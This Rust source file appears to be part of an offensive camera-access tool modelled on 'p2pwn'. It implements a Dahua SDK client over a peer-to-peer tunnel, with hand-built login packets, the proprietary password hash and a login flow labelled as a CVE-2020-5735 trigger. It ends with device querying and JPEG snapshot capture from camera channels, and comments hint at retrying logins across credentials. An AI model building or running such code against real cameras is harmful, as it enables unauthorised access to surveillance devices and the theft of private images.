use std::time::Duration;

use tokio::net::UdpSocket;
use tokio::sync::Mutex;

use crate::p2p::{self, PTCPSession};

/// Native Dahua SDK (binary protocol) TCP port. Reachable through the PTCP
/// tunnel by binding a fresh realm to this remote port — never via the device
/// public IP (that stays behind NAT).
pub const SDK_PORT: u16 = 37777;

// ---- hash helpers (mirror core/p2p/auth.go from thebadinteger/p2pwn) ----

pub fn md5_hex_upper(s: &str) -> String {
    format!("{:X}", md5::compute(s.as_bytes()))
}

/// Gen1Hash: MD5(password) reduced to 8 alphanumeric chars.
fn gen1_hash(password: &str) -> String {
    let raw = md5::compute(password.as_bytes());
    let raw = raw.0;
    let mut out = [0u8; 8];
    for i in 0..8 {
        let val = (raw[i * 2] as u16 + raw[i * 2 + 1] as u16) % 62;
        out[i] = if val < 10 {
            val as u8 + 48
        } else if val < 36 {
            val as u8 + 55
        } else {
            val as u8 + 61
        };
    }
    String::from_utf8(out.to_vec()).unwrap_or_default()
}

fn standard_rpc_hash(user: &str, password: &str, realm: &str, random: &str) -> String {
    let step1 = md5_hex_upper(&format!("{}:{}:{}", user, realm, password));
    md5_hex_upper(&format!("{}:{}:{}", user, random, step1))
}

fn sdk_login_hash(user: &str, password: &str, realm: &str, random: &str) -> String {
    let first_half = standard_rpc_hash(user, password, realm, random);
    let gen1 = gen1_hash(password);
    let second_half = md5_hex_upper(&format!("{}:{}:{}", user, random, gen1));
    format!("{}{}", first_half, second_half)
}

// ---- binary packets (mirror core/p2p/sdkbin.go) ----

pub fn login_packet(user: &str, pass: &str) -> Vec<u8> {
    let ul = user.as_bytes();
    let pl = pass.as_bytes();

    let mut creds = [0u8; 16];
    let n = ul.len().min(8);
    creds[..n].copy_from_slice(&ul[..n]);
    let n = pl.len().min(8);
    creds[8..8 + n].copy_from_slice(&pl[..n]);

    let pkt_len = 24 + ul.len() + pl.len();
    let ts = chrono::Utc::now().timestamp();

    let mut cmd = Vec::with_capacity(32 + ul.len() + pl.len() + 32);
    cmd.extend_from_slice(&[0xa0, 0x00, 0x00, 0x60, pkt_len as u8, 0x00, 0x00, 0x00]);
    cmd.extend_from_slice(&creds);
    cmd.extend_from_slice(&[0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0xa1, 0xaa]);
    cmd.extend_from_slice(ul);
    cmd.extend_from_slice(b"&&");
    cmd.extend_from_slice(pl);
    cmd.extend_from_slice(format!("\x00Random:{}\r\n\r\n", ts).as_bytes());
    cmd
}

/// "Old style" login trigger with blank hashes (CVE-2020-5735). Newer
/// firmware only issues the Realm:/Random: challenge after receiving this
/// packet; a plaintext `04 01` login is answered with a header-only code-1.
pub fn old_style_login_trigger() -> Vec<u8> {
    let mut cmd = vec![0xa0, 0x05, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00];
    cmd.extend_from_slice(&[0u8; 16]);
    cmd.extend_from_slice(&[0x05, 0x02, 0x00, 0x01, 0x00, 0x00, 0xa1, 0xaa]);
    cmd
}

/// Hash login response using the CVE-2020-5735 frame: 32-byte header with the
/// payload length at bytes 4..8 ("admin&&" + 64-char hash = 71 = 0x47), then
/// `05 02 00 08 00 00 a1 aa` and `user&&<random_hash><final_hash>`.
fn build_old_style_hash_login_packet(user: &str, hash: &str) -> Vec<u8> {
    let creds = format!("{}&&{}", user, hash);
    let creds_len = creds.len() as u32;

    let mut buf = vec![0xa0, 0x05, 0x00, 0x60];
    buf.extend_from_slice(&creds_len.to_le_bytes());
    buf.extend_from_slice(&[0u8; 16]);
    buf.extend_from_slice(&[0x05, 0x02, 0x00, 0x08, 0x00, 0x00, 0xa1, 0xaa]);
    buf.extend_from_slice(creds.as_bytes());
    buf
}

fn session_id_from_resp(resp: &[u8]) -> u32 {
    if resp.len() >= 20 {
        u32::from_le_bytes([resp[16], resp[17], resp[18], resp[19]])
    } else {
        0
    }
}

fn build_hash_login_packet(user: &str, hash: &str) -> Vec<u8> {
    let creds = format!("{}&&{}", user, hash);
    let creds = creds.as_bytes();

    let mut buf = vec![0x05, 0x02, 0x09, 0x08];
    buf.extend_from_slice(&(creds.len() as u16).to_le_bytes());
    buf.extend_from_slice(&[0x00, 0x00, 0xa1, 0xaa]);
    buf.extend_from_slice(creds);
    buf
}

fn parse_challenge_body(body: &[u8]) -> Option<(String, String)> {
    let text = String::from_utf8_lossy(body);
    let realm = extract_token(&text, "Realm:");
    let random = extract_token(&text, "Random:");
    match (realm, random) {
        (Some(r), Some(rn)) if !r.is_empty() && !rn.is_empty() => Some((r, rn)),
        _ => None,
    }
}

fn extract_token<'a>(text: &'a str, token: &str) -> Option<String> {
    let idx = text.find(token)?;
    let after = &text[idx + token.len()..];
    let end = after.find("\r\n")?;
    Some(after[..end].trim().to_string())
}

pub fn sdk_cmd_get_serial() -> Vec<u8> {
    let mut cmd = vec![
        0xa4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    ];
    cmd.resize(32, 0);
    cmd
}

pub fn sdk_cmd_get_device_type() -> Vec<u8> {
    let mut cmd = vec![
        0xa4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
    ];
    cmd.resize(32, 0);
    cmd
}

pub fn sdk_cmd_get_channels() -> Vec<u8> {
    let mut cmd = vec![
        0xa8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    ];
    cmd.resize(32, 0);
    cmd
}

/// Binary snapshot command (72 bytes) for the requested channel (0-based).
pub fn snapshot_cmd(ch: u8) -> Vec<u8> {
    let mut cmd = Vec::with_capacity(72);
    cmd.extend_from_slice(&[0x11, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00]);
    cmd.extend_from_slice(&[0u8; 20]);
    cmd.extend_from_slice(&[0x0a, 0x00, 0x00, 0x00]);
    cmd.push(ch);
    cmd.extend_from_slice(&[0u8; 16]);
    cmd.extend_from_slice(&[0u8; 3]);
    cmd.push(ch);
    cmd.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
    cmd.extend_from_slice(&[0u8; 8]);
    cmd.extend_from_slice(&[0u8; 7]);
    cmd
}

fn strip_snapshot_garbage(data: &mut Vec<u8>, ch: u8) {
    let garbage1 = [0x0a, ch, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00];
    loop {
        let idx = data.windows(8).position(|w| w == garbage1);
        let Some(idx) = idx else { break };
        let start = idx.saturating_sub(24);
        let end = idx + 8;
        data.drain(start..end);
    }

    let garbage2 = [0xbc, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, ch];
    loop {
        let idx = data.windows(9).position(|w| w == garbage2);
        let Some(idx) = idx else { break };
        let end = idx + 32;
        data.drain(idx..end);
    }
}

fn sdk_string(resp: &[u8]) -> String {
    if resp.len() <= 32 {
        return String::new();
    }
    resp[32..]
        .iter()
        .take_while(|&&b| b != 0)
        .map(|&b| b as char)
        .collect()
}

// ---- SDK client over the existing PTCP tunnel ----

pub struct SdkClient {
    pub user: String,
    pub pass: String,
    pub verbose: bool,
}

/// Why an SDK channel query ended, so the caller can tell "wrong password"
/// apart from "the device will not open another PTCP channel".
#[derive(Debug, PartialEq, Eq)]
pub enum SdkInfo {
    Channels {
        serial: String,
        model: String,
        channels: usize,
    },
    /// The PTCP bind on 37777 never established. No credential can fix
    /// that, so retrying with other logins only burns time.
    BindFailed,
    /// The bind worked but these credentials were rejected.
    LoginFailed,
}

impl SdkClient {
    pub fn new(user: &str, pass: &str) -> Self {
        SdkClient {
            user: user.to_string(),
            pass: pass.to_string(),
            verbose: false,
        }
    }

    pub fn with_verbose(mut self, verbose: bool) -> Self {
        self.verbose = verbose;
        self
    }

    async fn debug(&self, msg: String) {
        if self.verbose {
            eprintln!("  [debug] sdk: {}", msg);
        }
    }

    async fn send_realm(sock: &UdpSocket, session: &Mutex<PTCPSession>, realm: u32, data: &[u8]) {
        let mut s = session.lock().await;
        p2p::udp_send(
            sock,
            &s.send(p2p::PTCPBody::Payload(p2p::PTCPPayload {
                realm,
                data: data.to_vec(),
            }))
            .serialize(),
        )
        .await;
    }

    /// Send loginPacket on an already-bound realm; on a code-1 challenge reply,
    /// complete login on a fresh realm using the SDK hash. Returns the realm to
    /// use for subsequent exchanges.
    pub async fn login_on_bind(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
    ) -> Option<u32> {
        self.debug(format!(
            "login_on_bind realm={} user='{}'",
            realm, self.user
        ))
        .await;
        Self::send_realm(sock, session, realm, &login_packet(&self.user, &self.pass)).await;

        // No `?` here: it would return None with the realm still bound, leaking
        // a PTCP channel on every failed login. Firmware that accepts a single
        // channel then refuses the next bind, which surfaced as `BindFailed` on
        // port 80 right after the channel-discovery attempts.
        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "login resp[8]={:?} len={} bytes0=0x{:02X}{:02X}{:02X}{:02X}..0x{:02X}{:02X}{:02X}{:02X}",
            resp.get(8),
            resp.len(),
            resp.first().copied().unwrap_or(0),
            resp.get(1).copied().unwrap_or(0),
            resp.get(2).copied().unwrap_or(0),
            resp.get(3).copied().unwrap_or(0),
            resp.get(28).copied().unwrap_or(0),
            resp.get(29).copied().unwrap_or(0),
            resp.get(30).copied().unwrap_or(0),
            resp.get(31).copied().unwrap_or(0),
        ))
        .await;
        if resp.get(8).copied() == Some(0) {
            return Some(realm);
        }
        if resp.get(8).copied() == Some(1) {
            // The device demands a hash login. Some firmware include
            // "Realm:/Random:" in this very reply; newer firmware (6.6.x) reply
            // header-only and expect a CVE-2020-5735 old-style login trigger to
            // deliver the challenge. Prefer the inline challenge when present.
            let inline = parse_challenge_body(&resp);
            if let Some((cr, crnd)) = inline {
                self.debug(format!(
                    "challenge requested (realm='{}' rnd='{}')",
                    cr, crnd,
                ))
                .await;
                // This path binds a *new* realm, so the one we already hold must
                // be released here or it stays bound for the rest of the run.
                let new_realm = self
                    .login_with_hash_new_realm(sock, session, &cr, &crnd)
                    .await;
                if new_realm.is_some() {
                    p2p::ptcp_disconnect(sock, session, realm).await;
                }
                return new_realm;
            }
            self.debug("challenge requested (header-only, no Realm/Random) — using CVE-2020-5735 old-style trigger".into())
                .await;
            return self.login_cve_trigger(sock, session, realm).await;
        }
        self.debug(format!("login rejected: code={:?}", resp.get(8)))
            .await;
        None
    }

    async fn login_with_hash_new_realm(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        challenge_realm: &str,
        challenge_random: &str,
    ) -> Option<u32> {
        let mut cr = challenge_realm.to_string();
        let mut crnd = challenge_random.to_string();

        let realm = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(10)).await?;
        self.debug(format!(
            "challenge accepted → new bind realm={} on SDK_PORT",
            realm
        ))
        .await;

        // the new bind may carry a fresh challenge
        if let Some(ch) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(1),
        )
        .await
        {
            self.debug(format!(
                "fresh bind first bytes: len={} 0x{:02X}{:02X}..0x{:02X}{:02X}{:02X}",
                ch.len(),
                ch.first().copied().unwrap_or(0),
                ch.get(1).copied().unwrap_or(0),
                ch.get(29).copied().unwrap_or(0),
                ch.get(30).copied().unwrap_or(0),
                ch.get(31).copied().unwrap_or(0),
            ))
            .await;
            if let Some((nr, nrand)) = parse_challenge_body(&ch) {
                self.debug(format!(
                    "fresh challenge on new realm: r='{}' rnd='{}' (was r='{}')",
                    nr, nrand, cr
                ))
                .await;
                cr = nr;
                crnd = nrand;
            }
        }

        let full_hash = sdk_login_hash(&self.user, &self.pass, &cr, &crnd);
        self.debug(format!(
            "sending hash login realm={} hash(len={})",
            realm,
            full_hash.len()
        ))
        .await;
        Self::send_realm(
            sock,
            session,
            realm,
            &build_hash_login_packet(&self.user, &full_hash),
        )
        .await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "hash login resp[8]={:?} len={}",
            resp.get(8),
            resp.len()
        ))
        .await;
        if resp.get(8).copied() == Some(0) {
            Some(realm)
        } else {
            None
        }
    }

    /// CVE-2020-5735 login flow for newer firmware: send the old-style login
    /// trigger (blank hashes) to force a Realm:/Random: challenge, then answer
    /// with the old-style hash login frame on the same realm. Success is a
    /// non-zero session id in header bytes 16..20 (or resp[8]==0).
    async fn login_cve_trigger(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
    ) -> Option<u32> {
        self.debug(format!("cve trigger old-style login realm={}", realm))
            .await;
        Self::send_realm(sock, session, realm, &old_style_login_trigger()).await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "cve trigger resp len={} bytes0=0x{:02X}{:02X}{:02X}{:02X} sess={}",
            resp.len(),
            resp.first().copied().unwrap_or(0),
            resp.get(1).copied().unwrap_or(0),
            resp.get(2).copied().unwrap_or(0),
            resp.get(3).copied().unwrap_or(0),
            session_id_from_resp(&resp),
        ))
        .await;

        let (cr, crnd) = parse_challenge_body(&resp)?;
        self.debug(format!("cve challenge realm='{}' rnd='{}'", cr, crnd))
            .await;

        let full_hash = sdk_login_hash(&self.user, &self.pass, &cr, &crnd);
        self.debug(format!(
            "cve sending old-style hash login hash(len={})",
            full_hash.len()
        ))
        .await;
        Self::send_realm(
            sock,
            session,
            realm,
            &build_old_style_hash_login_packet(&self.user, &full_hash),
        )
        .await;

        let Some(resp) = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(10),
        )
        .await
        else {
            p2p::ptcp_disconnect(sock, session, realm).await;
            return None;
        };
        self.debug(format!(
            "cve hash login resp[8]={:?} len={} sess={}",
            resp.get(8),
            resp.len(),
            session_id_from_resp(&resp),
        ))
        .await;
        if resp.get(8).copied() == Some(0) || session_id_from_resp(&resp) != 0 {
            Some(realm)
        } else {
            None
        }
    }

    async fn sdk_exchange(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        realm: u32,
        cmd: &[u8],
    ) -> Option<Vec<u8>> {
        Self::send_realm(sock, session, realm, cmd).await;
        p2p::read_realm_single(sock, session, realm, Duration::from_secs(5)).await
    }

    /// Query serial, model and channel count via the SDK (37777) protocol.
    pub async fn get_device_info(&self, sock: &UdpSocket, session: &Mutex<PTCPSession>) -> SdkInfo {
        self.debug("get_device_info: binding SDK_PORT".into()).await;
        let Some(realm) = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(5)).await
        else {
            return SdkInfo::BindFailed;
        };
        self.debug(format!("get_device_info: bound realm={}", realm))
            .await;

        let realm = match self.login_on_bind(sock, session, realm).await {
            Some(r) => r,
            None => {
                p2p::ptcp_disconnect(sock, session, realm).await;
                return SdkInfo::LoginFailed;
            }
        };

        let serial = self
            .sdk_exchange(sock, session, realm, &sdk_cmd_get_serial())
            .await
            .map(|r| sdk_string(&r))
            .unwrap_or_default();
        let model = self
            .sdk_exchange(sock, session, realm, &sdk_cmd_get_device_type())
            .await
            .map(|r| sdk_string(&r))
            .unwrap_or_default();
        let channels = self
            .sdk_exchange(sock, session, realm, &sdk_cmd_get_channels())
            .await
            .map(|r| -> usize {
                let content = sdk_string(&r);
                if content.is_empty() {
                    0
                } else {
                    content.split("&&").count()
                }
            })
            .unwrap_or(0);

        p2p::ptcp_disconnect(sock, session, realm).await;
        SdkInfo::Channels {
            serial,
            model,
            channels,
        }
    }

    /// Capture a JPEG snapshot for the given channel (1-based, mirrors p2pwn
    /// GetSnapshot: channel 1 -> byte 0).
    pub async fn get_snapshot(
        &self,
        sock: &UdpSocket,
        session: &Mutex<PTCPSession>,
        channel: usize,
    ) -> Option<Vec<u8>> {
        let ch = if channel > 0 {
            ((channel - 1) % 256) as u8
        } else {
            0
        };

        let bound = p2p::ptcp_bind(sock, session, SDK_PORT, Duration::from_secs(5)).await?;
        self.debug(format!(
            "get_snapshot ch{}: bound realm={} on SDK_PORT",
            channel, bound
        ))
        .await;
        let Some(realm) = self.login_on_bind(sock, session, bound).await else {
            // login_on_bind can return None after moving to a second realm; close
            // the original bind either way so a failed attempt does not leak it.
            p2p::ptcp_disconnect(sock, session, bound).await;
            return None;
        };
        let moved = realm != bound;
        self.debug(format!(
            "get_snapshot ch{}: logged in, realm={}{}",
            channel,
            realm,
            if moved { " (hash-moved)" } else { "" }
        ))
        .await;

        // drain any leftover frames before requesting the snapshot
        let _ = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(50),
            Duration::from_millis(200),
        )
        .await;

        Self::send_realm(sock, session, realm, &snapshot_cmd(ch)).await;

        let data = p2p::sdk_read_realm(
            sock,
            session,
            realm,
            Duration::from_millis(200),
            Duration::from_secs(5),
        )
        .await;
        self.debug(format!(
            "get_snapshot ch{}: snapshot reply len={:?}",
            channel,
            data.as_ref().map(|d| d.len())
        ))
        .await;

        if moved {
            p2p::ptcp_disconnect(sock, session, bound).await;
        }
        p2p::ptcp_disconnect(sock, session, realm).await;

        let mut data = match data {
            Some(d) if d.len() >= 32 => d[32..].to_vec(),
            Some(d) => d,
            None => return None,
        };

        strip_snapshot_garbage(&mut data, ch);

        let soi = data.windows(2).position(|w| w == [0xFF, 0xD8])?;
        data = data[soi..].to_vec();
        if let Some(eoi) = data.windows(2).rposition(|w| w == [0xFF, 0xD9]) {
            data.truncate(eoi + 2);
            return Some(data);
        }
        None
    }
}
